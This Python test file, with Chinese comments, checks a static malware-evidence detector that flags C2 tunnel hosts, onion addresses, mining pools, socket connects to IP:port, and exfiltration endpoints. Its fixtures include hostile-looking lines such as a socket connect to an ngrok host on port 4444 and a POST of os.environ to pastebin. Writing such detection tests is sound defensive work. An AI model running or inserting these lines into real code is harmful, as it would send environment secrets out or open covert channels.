# -*- coding: utf-8 -*-
"""字面量证据通道：零数据流载荷不许被静默放行"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from src.static_evidence import (forbid_benign, render, scan,  # noqa: E402
                                 strongest)
from src.target_awareness import hostile_literal_in  # noqa: E402

PASS = FAIL = 0


def check(name, cond):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ✓ {name}")
    else:
        FAIL += 1
        print(f"  ✗ {name}")


def node(code, file='pkg/x.py', cap='network_out', nid='n1'):
    return {'node_id': nid, 'code': code, 'file': file,
            'line': 1, 'capability': cap}


def main():
    print("[1] C2/隧道字面量识别")
    check('ngrok 子域', hostile_literal_in(
        's.connect(("4.tcp.eu.ngrok.io", 19931))') == 'c2_tunnel')
    check('localtunnel', hostile_literal_in(
        'requests.post("https://foo.localtunnel.me/x")') == 'c2_tunnel')
    check('trycloudflare', hostile_literal_in(
        'urlopen("https://x.trycloudflare.com/a")') == 'c2_tunnel')
    check('onion', hostile_literal_in(
        'h = "abcdefghijklmnop.onion"') == 'onion')
    check('矿池', hostile_literal_in(
        'miner = "stratum+tcp://pool.xmr.com:3333"') == 'miner')

    print("[2] IP:port 只在连接点上算证据")
    check('connect + IP:port', hostile_literal_in(
        's.connect(("194.5.98.1", 4444))') == 'ip_port')
    check('普通 IP 字面量不算', hostile_literal_in(
        'IPV4 = "192.168.0.1"') is None)
    check('IP:port 但无连接语句不算', hostile_literal_in(
        'cfg = {"host": "1.2.3.4", "port": 8080}') is None)

    print("[3] 外传落点需要连接语句")
    check('pastebin + post', hostile_literal_in(
        'requests.post("https://pastebin.com/api", data=os.environ)')
        == 'exfil_endpoint')
    check('pastebin 仅注释不算', hostile_literal_in(
        '# see pastebin.com for docs') is None)

    print("[4] 正常代码不误报")
    check('普通 URL', hostile_literal_in(
        'url = "https://files.pythonhosted.org/x.tar.gz"') is None)
    check('普通库调用', hostile_literal_in(
        'rows = pdf.pages[0].extract_text()') is None)
    check('空串', hostile_literal_in('') is None)

    print("[5] scan：测试目录降级/排除")
    f = scan([node('s.connect(("4.tcp.eu.ngrok.io", 19931))')])
    check('强证据命中', len(f) == 1 and f[0]['level'] == 'strong')
    check('forbid_benign 为真', forbid_benign(f))
    f2 = scan([node('s.connect(("4.tcp.eu.ngrok.io", 19931))',
                    file='tests/test_x.py')])
    check('测试目录不产出证据', f2 == [])
    f3 = scan([node('print(1)')])
    check('无字面量无证据', f3 == [])

    print("[6] 弱证据不禁止 BENIGN")
    weak = [{'node_id': 'w', 'kind': 'exfil_endpoint', 'level': 'weak',
             'code': 'x', 'file': 'a.py', 'line': 1, 'capability': ''}]
    check('弱证据不禁止', forbid_benign(weak) is False)
    check('strongest 取强证据', strongest(
        weak + [{'level': 'strong', 'kind': 'onion'}]) == 'onion')

    print("[7] 渲染")
    check('渲染含类型与位置', 'c2_tunnel' in render(f) and 'pkg/x.py' in render(f))
    check('空证据渲染为空', render([]) == '')

    print(f"\n字面量证据: PASS={PASS} FAIL={FAIL}")
    return 0 if FAIL == 0 else 1


if __name__ == '__main__':
    sys.exit(main())
